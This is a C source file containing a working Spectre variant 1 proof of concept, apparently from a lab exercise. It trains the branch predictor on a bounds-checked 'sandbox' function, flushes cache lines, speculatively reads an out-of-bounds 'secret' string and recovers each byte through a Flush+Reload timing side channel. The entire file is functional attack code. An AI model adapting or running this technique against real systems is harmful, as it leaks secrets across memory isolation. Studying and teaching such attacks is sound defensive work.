#include <stdio.h>
#include <stdint.h>
#include <emmintrin.h>
#include <x86intrin.h>

#define DELTA 1024
#define CACHE_HIT_THRESHOLD (200)

unsigned int buffer_size = 10;
// restrictedAccess allowed to read
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
uint8_t temp = 0;
// restrictedAccess not allowed to read
char *secret = "Some Secret Value";
uint8_t array[256*4096];

// Sandbox Function
uint8_t restrictedAccess(size_t x) {
    if (x < buffer_size) {
        return buffer[x];
    } else {
        return 0;
    }
}

void reloadSideChannel() {
    int junk=0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    int i;
    for(i = 0; i < 256; i++){
        addr = &array[i*4096 + DELTA];
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;
        if (time2 <= CACHE_HIT_THRESHOLD){
//             printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
            printf("'%c'\n", (char) i);
            }
        }
}

void flushSideChannel(int n) {
    int i;
    // Write to array to bring it to RAM to prevent Copy-on-write
    for (i = 0; i < 256; i++) array[i*4096 + DELTA] = n+1;
    // Flush the values of the array from cache
    for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}

void spectreAttack(size_t larger_x) {
    int i;
    uint8_t s;
    // Train the CPU to take the true branch inside restrictedAccess().
    for (i = 0; i < 5000; i++) { restrictedAccess(i%10); }
        // Flush buffer_size and array[] from the cache.
        _mm_clflush(&buffer_size);
    for (i = 0; i < 256; i++) { _mm_clflush(&array[i*4096 + DELTA]); }
    // Ask restrictedAccess() to return the secret in out-of-order execution.
    s = restrictedAccess(larger_x);
    array[s*4096 + DELTA] += 88;
}

void readChar(int n) {
    flushSideChannel(n);
    size_t larger_x = (size_t)(&(secret[n]) - (char*)buffer);
    spectreAttack(larger_x);
    reloadSideChannel();
}

int main() {
    int i;
    for (i = 0; i < 17; i++) {
        printf("Possibilites for Char %d\n",i);
        readChar(i);
    }
    return (0);
}
